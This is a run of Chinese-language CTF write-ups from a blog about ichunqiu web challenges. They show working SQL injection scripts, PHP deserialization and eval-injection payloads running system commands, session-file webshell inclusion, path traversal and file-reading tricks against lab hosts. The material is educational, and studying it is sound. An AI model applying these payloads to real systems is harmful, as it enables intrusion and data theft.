1234567891011121314151617181920212223242526272829303132333435363738 server {​ listen 80 default_server;​ listen [::]:80 default_server ipv6only=on; root /var/www/html; index index.php index.html index.htm; server_name localhost; location / { try_files $uri $uri/ =404; location ~ \\.php$ { fastcgi_split_path_info ^(.+\\.php)(/.+)$; fastcgi_param SCRIPT_FILENAME /var/www/html$fastcgi_script_name; #fastcgi_pass unix:/var/run/php5-fpm.sock; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; include fastcgi_params; } } error_page 404 /404.html; error_page 500 502 503 504 /50x.html; location = /50x.html { root /var/www/html; } location /online-movies { alias /movie/; autoindex on; } location ~ /\\.ht { deny all; }} nginx服务器知识点 nginx服务器的配置文件是nginx.conf，存储路径为./etc/nginx/nginx.conf； 一般服务器存放路径为/var/www/html/； nginx.conf文件中，可以通过include其他路径文件来引用其他文件包含的配置，比如include sites-enabled/default;，这样做是为了把一些配置进行分类，方便在需要的时候快速启动或者关闭，这些路径是可变的，管理员可以自行设置； nginx.conf文件中，如果配置了autoindex on;，那么说明这个路径可以进行浏览目录下载文件，例如location /online-movies { alias /movie/; autoindex on; }中，location /online-movies路径就可以浏览目录下载文件，全路径一般是/etc/nginx/location/online-movies； 文件遍历是指的一个目录，可以直接进行访问； 开启文件遍历权限的路径，在路径后边添加文件的相对路径就可以下载到文件，在可视化界面访问不到的文件也可以进行下载，比如/var/www/html/flag.php 所以在这里 由于它有/online-movies ，所以我们可以进行浏览目录下载文件， http://c56bc9b5d3d94306b60d284c36ba4904d5a04f2c66114e60.changame.ichunqiu.com/online-movies../var/www/html/flag.php访问一下URL 就可以下载得到flag.php 123&lt;?php $flag='flag{794b0e81-a517-4d4e-acf0-3d9086915a2d}';echo 'flag_is_here'; web——hello world这道题目有点熟悉： 有个role，解码后是f:5:&quot;thrfg&quot;;好像之前做过这题吧，rot13解密以后，改为admin再登录看看，发现考点不是在这里，看源码有个flag.xmas.js可以访问，删除xms后就可以访问了，然后是一堆看不懂的代码 然后看了一下wp，说是git源码泄露，因为可以看到js的源码，于是尝试用githack工具抓取 看了一下wp，说是应该抓取到两个flag.js，然后进行比对就可以得到flag，但是这题，只有一个？？？直接输入那个flag.js.04bb09也没有发现，大概没了吧？ web——phone number一开始的登录界面推测是SQL注入所以尝试了一波 没有收获，于是在注册界面入手，因为是phone number题目，所以在手机号的地方应该可能性很大，进行注入试试：当我提交不是数字的时候，提示要为数字，将注入语句转为十六进制试试：有字符限制，只能输入十一位——在审查元素那边更改一下限制试试但是这题不论怎么注册都是dberror？？？看了下评论区也是，难道又炸了？？？？？算了理解思路就好了 web——GetFlag登录界面，看着像sql注入，于是尝试1’or 1=1# 密码随意，验证码用之前写过的脚本就行了 123456789import hashlibs='163e9e'for i in range(1,99999999): a=i i=hashlib.md5(str(i).encode('utf-8')).hexdigest() # print(i) if i[0:6] == str(s): print(a) break 即可登录 1234a.php:&lt;?php echo &quot;Do what you want to do, web dog, flag is in the web root dir&quot;;?&gt; 点开源码：发现有个文件包含漏洞 但是没拿到真的，想起来上面的源码说flag 在网站根目录下，于是尝试/var/www/html/flag.php、/var/www/html/challenges/flag.php、/var/www/html/challenges/file/flag.php都不行，于是去看了一下wp，说就是第二个路径，但是为啥打不开==，然后后面又说在flag.php页面，于是我直接访问flag.php，，发现根本就没这个页面？？？晕了==后来发现 原来c要大写….. 1234567891011121314151617181920&lt;?php$f = $_POST['flag'];$f = str_replace(array('`', '$', '*', '#', ':', '\\\\', '&quot;', &quot;'&quot;, '(', ')', '.', '&gt;'), '', $f);//过滤了那些字符if((strlen($f) &gt; 13) || (false !== stripos($f, 'return')))//flag的长度不能大于13，也不能有return字符{ die('wowwwwwwwwwwwwwwwwwwwwwwwww');}try{ eval(&quot;\\$spaceone = $f&quot;);}catch (Exception $e){ return false;}if ($spaceone === 'flag'){//将spaceone的值和flag作比较 echo file_get_contents(&quot;helloctf.php&quot;);}?&gt; eval函数特性1eval函数传入的必须是有效的 PHP 代码。所有的语句必须以分号结尾。比如 'echo &quot;Hi!&quot;' 会导致一个 parse error，而 'echo &quot;Hi!&quot;;' 则会正常运行。 为什么之前我们写一句话木马的时候没有这样呢？ 因为我们在前面加了个@所以这里需要输入的是flag=flag;然后点击源码，就可以看到flag了 web——中国象棋1234567&lt;script src=&quot;js/common.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;js/play.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;js/AI.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;js/bill.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;js/[abcmlyx]{2}ctf[0-9]{3}.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;js/gambit.js&quot;&gt;&lt;/script&gt;&lt;div style=&quot;text-align:center;clear:both&quot;&gt; 这题又是只是盲区了，看了一下wp，说是js的正则表达式， 原来是这样，有一个js文件，文件名由abcmlyx的两个字母+ctf+0-9的三个数字组成，接下来就需要爆破了直接用burp suit抓包 进行爆破 然后选择爆破模式:cluster bomb分别对其进行爆破即可，然后没爆破出来发现 是我URL构造错了 应该是/js/xxxx.js！！！！！！！！！！！！！！ 然后就可以拿到flag了","link":"/2021/02/19/i%E6%98%A5%E7%A7%8B5/"},{"title":"i春秋6","text":"web——not found抓包看看请求报文，在返回报文中点多了有个X-method，又根据提示说The requested URL..，猜想会不会请求方法，于是开始尝试：1 GET 发送请求来获得服务器上的资源，请求体中不会包含请求数据，请求数据放在协议头中。另外get支持快取、缓存 、可保留书签等。幂等 2 POST 和get一样很常见，向服务器提交资源让服务器处理，比如提交表单、上传文件等，可能导致建立新的资源或者对 原有资源的修改。提交的资源放在请求体中。不支持快取。非幂等 3 HEAD 本质和get一样，但是响应中没有呈现数据，而是http的头信息，主要用来检查资源或超链接的有效性或是否可以可达、检 查网页是否被串改或更新，获取头信息等，特别适用在有限的速度和带宽下。 4 PUT 和post类似，html表单不支持，发送资源与服务器，并存储在服务器指定位置，要求客户端事先知 道该位置；比如post是在一个集合上（/province），而put是具体某一个资源上（/province/123）。所以put是安全的， 无论请求多少次，都是在123上更改，而post可能请求几次创建了几次资源。幂等 5 DELETE 请求服务器删除某资源。和put都具有破坏性，可能被防火墙拦截。如果是https协议，则无需担心。幂等 6 CONNECT HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。就是把服务器作为跳板，去访问其他网页 然后把数据返回回来，连接成功后，就可以正常的get、post了。 7 OPTIONS 获取http服务器支持的http请求方法，允许客户端查看服务器的性能，比如ajax跨域时的预检等。 8 TRACE 回显服务器收到的请求，主要用于测试或诊断。一般禁用，防止被恶意攻击 在使用OPTIONS的时候，出现了locationf ?f=1.php的跳转，尝试访问，访问不了看了一下wp 说可以扫描一下目录 看看有没有其他提示信息扫到了一个.htaccess apache网站的配置文件，于是用这个文件包含漏洞打开试试， 打开这个网页试试：需要伪造IP，这里说XFF 但是我用XFF伪造IP后 还是这个页面，于是查了一下 还有什么 伪造IP的方法:获取客户端IP，很多代码都会拿 HTTP_CLIENT_IP的值，其次拿 HTTP_X_FORWARDED_FOR，最后是 REMOTE_ADDR。参考：https://segmentfault.com/q/1010000000686700/a-1020000000687155所以 这里我们就可以： web——SQLI看起来就像是SQL注入的题目，看看过滤了啥吧: 发现出现%会报错，看了一下wp，发现是sprintf格式化字符串逃逸漏洞于是学习一下，感觉和之前的宽字节注入差不多呀？都是吃掉字符，但是又不太一样: sprintf格式化字符串逃逸漏洞在php的格式化字符串中，%后的一个字符(除了’%’)会被当作字符类型，而被吃掉，单引号’，斜杠\\也不例外。 使用%1$吃掉后面的斜杠，而不引起报错参考：https://cloud.tencent.com/developer/article/1669052 直接看payload吧:用户名正确和错误返回的内容也不一样，所以直接看脚本吧:写脚本肯定是要先测试语句的，然后发现 后面只能用ascii码 不能像之前一样直接用字符了,由于太懒 所以就没盲注库名的长度: 12345678910111213141516import requestsimport stringurl=r&quot;http://9e2fcad6c50a4de1be1014554d7c980bef18347a5c9b46b2.changame.ichunqiu.com/&quot;s=requests.session()headers=s.get(url).headersdb_name=''for i in range(1,5): for j in range(65,123): payload=f&quot;admin%1$'and ascii(substr(database(),{i},1))={j}#&quot; data={'username':payload,'password':'admin'} # print(s.post(url,data=data).text) # print(payload) if &quot;password error!&quot; in s.post(url,data=data).text: print(&quot;11111111&quot;) db_name+=chr(j) print(db_name) 1234567891011121314151617import requestsimport stringurl=r&quot;http://9e2fcad6c50a4de1be1014554d7c980bef18347a5c9b46b2.changame.ichunqiu.com/&quot;s=requests.session()headers=s.get(url).headersdb_name=''for i in range(1,33): for j in range(65,126): payload=f&quot;admin%1$'and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x666c6167),{i},1))={j}#&quot; data={'username':payload,'password':'admin'} # print(s.post(url,data=data).text) print(payload) if &quot;password error!&quot; in s.post(url,data=data).text: print(&quot;11111111&quot;) db_name+=chr(j) print(db_name) break 刚跑出了表是flag，字段名也是flag 1234567891011121314151617import requestsimport stringurl=r&quot;http://9e2fcad6c50a4de1be1014554d7c980bef18347a5c9b46b2.changame.ichunqiu.com/&quot;s=requests.session()headers=s.get(url).headersdb_name=''for i in range(33,50): for j in range(45,126): payload=f&quot;admin%1$'and ascii(substr((select flag from flag),{i},1))={j}#&quot; data={'username':payload,'password':'admin'} # print(s.post(url,data=data).text) print(payload) if &quot;password error!&quot; in s.post(url,data=data).text: print(&quot;11111111&quot;) db_name+=chr(j) print(db_name) break 需要说明的是，这里的范围一开始我是1-33后来发现还剩一半没跑出来 于是就继续叠加上去了flag{b5b36121-86dd-a4db-aab3-86ddb749dfa1}感觉每次做完要写脚本的题目就想去世 web——Hash在源码中给到了这样一句话: 1&lt;!--$hash=md5($sign.$key);the length of $sign is 8--&gt; f9109d5f83921a551cf859f853afe7bb MD5解密后为kkkkkk01123根据这句话说 sign是kkkkkk01 key是123他说you are 123;if you are not 123,you can get the flag所以我们把key改成456 则：kkkkkk01456 MD5加密后为:打开看看: 1234567891011121314151617181920212223242526272829303132&lt;?phpclass Demo { private $file = 'Gu3ss_m3_h2h2.php'; public function __construct($file) { $this-&gt;file = $file; } function __destruct() { echo @highlight_file($this-&gt;file, true); } function __wakeup() { if ($this-&gt;file != 'Gu3ss_m3_h2h2.php') { //the secret is in the f15g_1s_here.php $this-&gt;file = 'Gu3ss_m3_h2h2.php'; } }}if (isset($_GET['var'])) { $var = base64_decode($_GET['var']); if (preg_match('/[oc]:\\d+:/i', $var)) { die('stop hacking!'); } else { @unserialize($var); }} else { highlight_file(&quot;Gu3ss_m3_h2h2.php&quot;);}? 得到这段源码:先看看下面的吧: get一个var值 经过解码以后，如果这个var值经过正则匹配，匹配内容为:先匹配一下一个字母o或者c匹配字符:/i是不区分大小写如果匹配到 则die没有的话就反序列化var，如果没收到值就高亮显示那个php文件那上面的那个类有啥用？看了一下wp说是要去看CVE-2016-7124漏洞，然后就能理解了:在反序列化的过程中，如果使用了Demo类则会优先使用wakeup()函数，而这个wake_up函数又会使打开的文件变成Gu3ss_m3_h2h2.php，而我们根据提示，知道我们要打开的是f15g_1s_here.php这个文件，在destruct()函数中就会被打开，所以在这里 我们需要传入一个值，并且调用了class，使得这个值的file为f15g_1s_here.php，绕过这个wakeup()函数和正则表达式： 1234567891011121314&lt;?phpclass Demo{ private $file='Gu3ss_m3_h2h2.php'; public function __construct($file) { $this-&gt;file = $file; }}$a = new Demo('f15g_1s_here.php');$b = serialize($a);$b=str_ireplace(&quot;O:4&quot;,&quot;O:+4&quot;,$b);//有的时候绕过不需要这个步骤$b=str_ireplace(&quot;:1:&quot;,&quot;:2:&quot;,$b);$b=base64_encode($b);echo $b;?&gt; 得到输出的结果为TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQ==PS：1.一开始我是直接在burpsuit进行base64加密的，怎么都出不来页面，于是看了一下wp发现要在PHP中完成所有操作，包括绕过wakeup()函数的操作，绕过正则的操作，并且进行base64加密，如果在burpsuit里面加密结果是不一样的2.根据之前所说的我们需要新建一个类，并调用里面的public function，使得我们输入的文件名变成$file，然后再被destruct()中的方法使用 访问新的页面得到以下代码 123456789 &lt;?phpif (isset($_GET['val'])) { $val = $_GET['val']; eval('$value=&quot;' . addslashes($val) . '&quot;;');} else { die('hahaha!');}?&gt; addslashes过滤了单引号、双引号、反斜杠、null这里是让我们传入一个val，会使用eval执行—— eval命令执行漏洞这里学了一种很巧妙的构造语句的方式：payload： 12?val=${eval($_GET[a])}&amp;a=system('ls');//让变量$value等于新变量也去执行一个eval来get一个a参数的值，而我们再以get的方式将a参数传入执行 接下来可以看到True_F1ag_i3_Here_233.php这样一个文件夹，然后打开 123?val=${eval($_GET[a])}&amp;a=system('cat+True_F1ag_i3_Here_233.php');//这里有个地方1.因为空格被过滤了，所以要用+号来代替空号（这里卡了好久）//2.明明引号也被过滤了，为啥引号还在？我还以为我记错了代码了，把引号去掉，发现是执行不了的？ 感觉这题有好多东西，要好好积累一下，并且要记得去整理一下反序列化和序列化的漏洞以及知识！","link":"/2021/02/22/i%E6%98%A5%E7%A7%8B6/"},{"title":"i春秋7","text":"web——fuzzing打开页面 啥也没有，抓包看看有没有解题信息 发现写了一个超大内网，百度了一下，内网范围为10.0.0.0——10.255.255.255使用XFF修改了一下IP，访问得到以上地址，他说show your key，我们就发送key，一开始是get方式发送的，发现不行，后来就改成了post就可以了。 1key is not right,md5(key)===&quot;1b4167610ba3f2ac426a68488dbd89be&quot;,and the key is ichunqiu***,the * is in [a-z0-9] 出现这句话，接下来就用脚本跑一下后面三位是a-z0-9，但这里可以直接把后面那串拿去MD5解密一下，得到ichunqiu105 用脚本跑的话如下: 12345678910111213141516onimport requestsimport hashlibimport strings=requests.session()url=&quot;http://fe26ac8277bb435fbb5f8355355425a9e6dfa59cc4064743.changame.ichunqiu.com/Challenges/./m4nage.php&quot;headers={&quot;X-Forwarded-For&quot;:'10.0.0.0'}key='ichunqiu'payload='0123456789'for i in payload: for j in payload: for h in payload: data={&quot;key&quot;:key+i+j+h} print(data) if &quot;key is not right&quot; not in s.post(url,data=data,headers=headers).text: print(key+i+j+h) exit() 打开看看 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) { $ckey_length = 4; $key = md5($key ? $key : UC_KEY); $keya = md5(substr($key, 0, 16)); $keyb = md5(substr($key, 16, 16)); $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : ''; $cryptkey = $keya . md5($keya . $keyc); $key_length = strlen($cryptkey); $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string; $string_length = strlen($string); $result = ''; $box = range(0, 255); $rndkey = array(); for ($i = 0; $i &lt;= 255; $i++) { $rndkey[$i] = ord($cryptkey[$i % $key_length]); } for ($j = $i = 0; $i &lt; 256; $i++) { $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; } for ($a = $j = $i = 0; $i &lt; $string_length; $i++) { $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); } if ($operation == 'DECODE') { if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) { return substr($result, 26); } else { return ''; } } else { return $keyc . str_replace('=', '', base64_encode($result)); }} 他的意思是 根据39f4zSTZu9c/laWu0cRvZq7i1XMDxPnf5e4en8EtDTYmIQRKLchr36IN+pSbn9NzBae3B5mwptxrbBjlQjWJCwb0JFa47wk和上面的解密方式，就可以得到flag 只要在最后加上一句话: 1echo authcode($string = '5f04rJx7uHz25mDp4vUfC0JB4Nx5nMvyQzHwjRb6kN88N+T9RRipbwbHDIcRWtqXjemcJit26oE1Vu6lpdQPZ6St/obCAEc', $operation = 'DECODE', $key = 'ichunqiu105'); flag{e6240cc3-d3ea-41ec-9778-10f5ca5e308b} web——再见CMS首先要看看是什么cms，然后再去查找出现过的漏洞，这里看了一下WP，说是看备案号可以查询得到，发现是齐博CMS然后查询已有的漏洞:先注册下账号，记录好自己的uid:3该网站的漏洞是这样的：在该http://3893215cde9541e9ab9e40ed01fd1bca93c93c73b8774146.changame.ichunqiu.com/member/userinfo.php?job=edit&amp;step=2 URL下存在sql注入漏洞，所以我们可以post 1truename=xxxx%0000&amp;Limitword[000]=&amp;email=123@qq.com&amp;provinceid=,address=(select user()) where uid=3%23 以上payload进行注入，这里解释一下:%00会被转义成\\0而后面limitword[000]=空，则是说将truename里面的000替换为空，这是就只剩下一个\\，update table set a=’111’,b=’222’ where uid=1假设更新信息的语句如上，那么代入内容则变成是:update table set a=’111\\‘,b=’222’ where uid=1那么替换的内容变成由本来的a=111变成a=111\\‘,b= 而我们的语句此时我们再引入一个逗号作为分隔，就变成是 1update table set a='111\\',b=',select user() wher uid=3# 接下来继续注入:爆出库名，看了一下wp，说flag不在这里，猜测是在var/www/html/flag.php，那么这里为什么可以猜测知道这个绝对路径呢?这里有一部分原因吧接下来如何 通过sql注入方式打开文件参考：https://www.cnblogs.com/blacksunny/p/8060028.html但是这里的单引号被过滤 所以就用十六进制表示: 12truename=xxxx%0000&amp;Limitword[000]=&amp;email=123@qq.com&amp;provinceid=,address=(select load_file(0x2f7661722f7777772f68746d6c2f666c61672e706870))where uid=3%23//select load_file('/var/www/html/flag.php') 查看源码即可获得flag web——notebook提示说让我们使用文件包含看看，为什么会想到扫描目录？因为我用phpinfo尝试了很久都没打开==，扫描目录看到这个文件，他是php1nFo.php接下来试试文件包含在哪：接下来看看有啥有用的信息吧，主要是毫无头绪不知道哪些信息对我有用，这里看了一下wp学习一下新知识: PHP文件包含–session利用条件：session文件路径已知，且其中内容部分可控。 php的session文件的保存路径可以在phpinfo的session.save_path看到。 session 的文件名格式为 sess_[phpsessid]，而 sessionid 在发送的请求的 cookie 字段中也可以看到。思路:所以这个时候就理顺了:1.我们可以在phpinfo中看看session保存的目录在哪，然后使用文件包含漏洞打开，因为session文件命名规则我们也知道。2.如何利用？我们注册用户，直接用php语句写入注册，由于文件包含漏洞打开文件会自动解析其中的php语言，所以我们就可以为所欲为了这个是session保存目录PHPSESSID=u2vfju7a353mgv6j1tbch1pid7; 1/action.php?module=&amp;file=../../../../tmp/SESS/sess_u2vfju7a353mgv6j1tbch1pid7 注册并登录，然后就可以用蚁剑连接上面的文件包含的链接 就可以看到flag了 web——Vld开头说 12do you know Vulcan Logic Dumper?false 这里留意一下这个Vulcan Logic Dumper,查看源码， 发现存在index.php.txt文件，打开以后可以得到一串代码内容，这个就是Vulcan Logic Dumper做的:PHP内核-Zend引擎：http://www.php.cn/php-weizijiaocheng-355597.html PHP中的opcode：https://blog.csdn.net/weiyuanke/article/details/76921476 Vulcan Logic Dumper：http://www.phppan.com/2011/05/vld-extension/ 也就是说我们刚才看到的一堆代码其实就是借助vld得到的，php语言中供zend引擎执行的中间代码opcode。有了opcode便可以将其翻译成php代码。 网上也没找到翻译opcode的工具，所以只能看着对照表自己翻译:参考学习：https://www.cnblogs.com/wosun/p/11386434.html 这里直接放翻译完的代码 传入值后，可以得到这个zip![img](https://raw.githubusercontent.com/Hwwg/myphoto/master/20210224102848.png) 这里有个select语句，分析看看能不能注入： 12345678910$db = new mysql_db(); $username = $db-&gt;safe_data($_POST['username']); $password = $db-&gt;my_md5($_POST['password']);//username经过mysql_db()的addslashes过滤 $number = is_numeric($_POST['number']) ? $_POST['number'] : 1; $username = trim(str_replace($number, '', $username));//将username里面的number换成空格然后再清空 $sql = &quot;select * from&quot;.&quot;`&quot;.table_name.&quot;`&quot;.&quot;where username=&quot;.&quot;'&quot;.&quot;$username&quot;.&quot;'&quot;;//这里其实还是以单引号闭合用点连接罢了 $row = $db-&gt;query($sql); $result = $db-&gt;fetch_array($row); 这里看了一下wp如何绕过，发现就是昨天刚用的方法–这次就一定要记住了在这里str_replace的内容是我们可控的，我们知道%00会被转义成/0所以我们让str_replace的替换为0这样username只剩下/，然后将后面接上单引号，，而单引号会被转义加上/那么此时前面的/就将这个/给转义掉’就逃逸出来了。构造payload: 1number=0&amp;username=%00'and extractvalue(1,concat(2,database()))#&amp;password=123&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 但是 网页上的这个login.php404了？？？？？？？？后来发现原来目录是:1chunqiu/login.php我吐了，之前就遇到过，目录目录目录要完整！！重要的事情说三遍然后一步步查询下去，最终可得 1number=0&amp;username=%00'and extractvalue(1,concat(2,(select group_concat(table_name) from information_schema.tables where table_schema=database())))#&amp;password=123&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 1number=00&amp;username=%000'and extractvalue(1,concat(2,(select group_concat(column_name) from information_schema.columns where table_name=0x666c6167)))#&amp;password=123&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 这里有个地方需要注意的是，我们前面替换的是0，因为会过滤引号，所以=后面需要使用十六进制进行绕过，但是使用十六进制有0所以这里替换的改成00就好了得到字段名为flag:由于报错注入一次回显内容有长度限制，一开始使用的select flag from flag就没办法完全将flag显示出来，所以这里改用substr 1number=00&amp;username=%000' and extractvalue(1,substr((select flag from flag),9,37))#&amp;password=123&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 flag{19b41a74-3424-42d1-aeda-974812111573}","link":"/2021/02/23/i%E6%98%A5%E7%A7%8B7/"},{"title":"i春秋8","text":"web——blog尝试注入无果，决定注册登录看看，在看到可以上传图片的时候，试试文件上传，发现报错： 得知是kindeditor，寻找漏洞:https://www.jb51.net/hack/367946.html尝试漏洞: 1/kindeditor/php/file_manager_json.php?path= 目录下存在文件包含漏洞但由于该漏洞只是目录遍历漏洞，所以没办法查看，于是回到前面，在post页面尝试一下sql注入，存在注入点，但是由于不知道列名所以union select一直使用不了，如果是过滤的话，当我输入select前台是可以回显的看一下wp，说是insert注入:1.推断insert的字段数——4个：payload:4’,’5’)# 此时没有报错2.构造注入语句，查看可回显字段位置，这里有个点，当我对后面的内容进行闭合注释的时候，发现网页是无回显内容的，推测可能注释了什么关键指令导致页面无法回显，所以这里的payload应写为: 123451','1'),('aaa',(select database()),'c //miniblog1','1'),('aaa',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'c//posts,users1','1'),('aaa',(select group_concat(column_name) from information_schema.columns where table_name='users'),'c//usernmae，password 1','1'),('aaa',(select group_concat(password) from users),'c //dbb616c5d935d8f34c12c291066d6fb7——&gt;melody123 使用管理员账号密码登录发现有个manage页面，查看，有文件包含漏洞，但是依旧无法看源代码法一：使用php://filter封装协议进行查看 flag{838c24a1-64d7-413b-8499-0ce7e32e0bef}参考学习:https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/**法二:**来自张力学长的博客:manager.php自包含产生栈溢出，down掉程序，php自启程序，但是写入的$_FILES[‘tmp’]存储在/tmp中没有被删除。 1payload：?module=php://filter/convert.base64encode/resource=../flag.php&amp;name= flag{838c24a1-64d7-413b-8499-0ce7e32e0bef}参考学习:https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/**法二:**来自张力学长的博客:manager.php自包含产生栈溢出，down掉程序，php自启程序，但是写入的$_FILES[‘tmp’]存储在/tmp中没有被删除。看都看不懂–先学习一下原理再来补充 思路小结整理一下这题的思路吧，看到login页面推测是注入——注入无果，注册账号登录页面继续探索——尝试上传木马来getshell，发现根本上传不了——看到路径信息，还有编辑器的名字——百度搜索已有漏洞，发现有文件浏览遍历漏洞——发现flag.php，无法使用php封装协议故无法打开源码——回到页面去寻找线索，在post页面尝试SQL注入，发现有注入点于是开始尝试注入——注入成功获得admin的密码——登录得到新页面manage——再次看到文件包含漏洞，发现可以使用php封装协议，读取源代码——获得flag web——OneThink原理在这里:https://ca3tie1.github.io/post/onethink10-code-execute-writeup/总结起来就是:我们注册的username会被缓存写入缓存文件夹中并进行注释，使得其中内容不会被执行，当我们在插入数据的前面添加换行符，我们的语句就绕过了注释符，就可以被执行，登录之后就会生成Runtime/Temp/2bb202459c30a1628513f40ab22fa01a.php文件夹，访问即可首先确定我们想要插入的语句，这里就直接使用system拿flag吧:$a=$_GET[‘a’];system($a);这里需要分两次进行注册，因为有长度限制 ![img](https://raw.githubusercontent.com/Hwwg/myphoto/master/20210225122023.png) 这里说一下为啥需要url解码两次: 1.我们没办法直接打出有换行符的用户名，所以我们先借助url编码后的换行符，传入以后会经过urlcode，这个时候就变成了%250a,经过一次解码后变成%0a就不是换行符了，所以我们先打出%0a到burp suit里面，将其两次解码成换行符，然后会经过一次urlcod变成%0a接下来就会再次被解码为换行符了，就达到我们的目的了 **PS：**每次注册完都要登录，才会被写入缓存文件当中 访问一下链接，查看源码就可以看到flag了 1Runtime/Temp/2bb202459c30a1628513f40ab22fa01a.php?a=cat ../../flag.php 1flag{8e5702a3-5a1c-467b-9ad9-c771bd65dfea} 吐槽一波 这个简单是简单，就是太恶心了吧，验证码经常出错–，每次还要连续按两次啊 web——攻击1234567891011121314151617181920&lt;?phpheader(&quot;content-type:text/html;charset=utf-8&quot;);show_source(__FILE__);echo '&lt;pre&gt;';include('u/ip.php');include('flag.php');if (in_array($_SERVER['REMOTE_ADDR'],$ip)){ die(&quot;您的ip已进入系统黑名单&quot;);}var_dump($ip);if ($_POST[substr($flag,5,3)]=='attack'){ echo $flag;}else if (count($_POST)&gt;0){ $ip = '$ip[]=&quot;'.$_SERVER['REMOTE_ADDR'].'&quot;;'.PHP_EOL; file_put_contents('u/ip.php',$ip,FILE_APPEND);}echo '&lt;/pre&gt;'; 根据以上代码我们可以知道，他一个ip只能攻击一次，但是它没对一次可以post的数据量限制，所以我们可以创建一个大字典，直接一起提交上去，他这边需要我们提交的是从flag第5位开始，一共三位的字符串，python脚本如下: 12345678910import requestsa = &quot;0123456789abcdefgh&quot;data = {}for i in a: for j in a: for k in a: data[i+j+k]=&quot;attack&quot;print(data)s=requests.post(&quot;http://ff9c93ad21d04a7982ebe8103dba94498e3845a6b33f49f5.changame.ichunqiu.com/&quot;,data=data)print(s.text) flag{269f92bb-9d65-44fc-8436-806b0bb6c5d1} web——时间:123456789101112&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;);'天下武功唯快不破';setcookie('token','hello');show_source(__FILE__);if ($_COOKIE['token']=='hello'){ $txt = file_get_contents('flag.php'); $filename = 'u/'.md5(mt_rand(1,1000)).'.txt';//生成一个随机txt文件 file_put_contents($filename,$txt);//将flag.php的内容写入txt中 sleep(10); unlink($filename);} 所以是这样的，当我们用名为token值为hello的cookie访问页面的时候，会生成一个随机txt文件，并且flag.php的内容会写入其中，经过十秒后，文件就会被删除，1.先生成一个md5加密的文件名字典： 123import hashlibfor i in range(1,1000): print('u/'+hashlib.md5(str(i).encode('utf-8')).hexdigest()+'.txt') 这里既可以使用burpsuit去跑，也可以用御剑去跑，可能要多尝试几次，毕竟只有十秒钟，或者线程调大一些 1 flag{913f76f9-9af0-4f9d-8c5b-a2195e64bd22} web——登录有个登录框： 12admin'or 1=1#admin'or 1=2# 回显不一样 第一个密码错误，第二个用户名错误，存在注入，burp suit跑一下看看过滤了什么:记得以前看过like可以盲注，今天来学习一下: LIKE语法LIKE语句的语法格式是:*select * from 表名 where 字段名 like 对应值（子串）*它主要是针对字符型字段，它的作用是在一个字符型字段列中检索包含对应子串。例子： 后面的%是一个通配符还有常用更多的通配符参考： _代表一个字符，例如D___就代表显示出以D为首后面接三个字符的数据https://blog.csdn.net/derpvailzhangfan/article/details/2452064而这里是不区分大小写的 构造盲注语句121'or user_n3me like 'X%'#1'or p3ss_w0rd like 'X%'# 这里说明一下为什么字段名为这两个，其实有点猜测的成分在这里，因为这题大部分函数都过滤了，所以想要得出字段名只能靠猜测，想起来之前也有一题也是这样的，字段名就藏在网页提交表单的表名中 接下来的任务就是编写盲注脚本: 123456789101112131415import requestss=requests.session()url=r&quot;http://15de6b62f20a4f5ba230856fe9419aeef1b157ed7220439a.changame.ichunqiu.com/Challenges/login.php&quot;headers=s.get(url).headersusername=''password=''pay_try=&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;for j in range(0,10): for i in pay_try: payload = f&quot;1'or user_n3me like '{username + i}%'#&quot; data = {'username': payload, 'password': 'test'} if &quot;密码错误&quot; in s.post(url, data=data).text: username += i print(username) break 得到用户名bctf3dm1n。密码的爆破就把payload的内容更换一下，这里说一下这个长度，由于我比较懒，所以就没爆破长度，直接去试，如果想要先爆破长度可以这样将like后面的内容换成_并且随着循环次数的增加_的数量会增加，if的判断是如果用户名错误，就直接终止整个程序 这个看起来就像是MD5加密，解密一下得到:adminqwe123666 登录后得到这个信息，看起来像是git？ 猜测是源码泄露，工具扫描一下 之前用的都是githack可能是我版本没更新一直没看下载完全 于是我换了一个git_extract，也不行？？只有一个flag.php，问题出在哪了吗，看了一下wp发现也是这样写的呀，于是就直接去看了一下别人的题解，发现下载到那个文件以后，访问就可以看到flag了 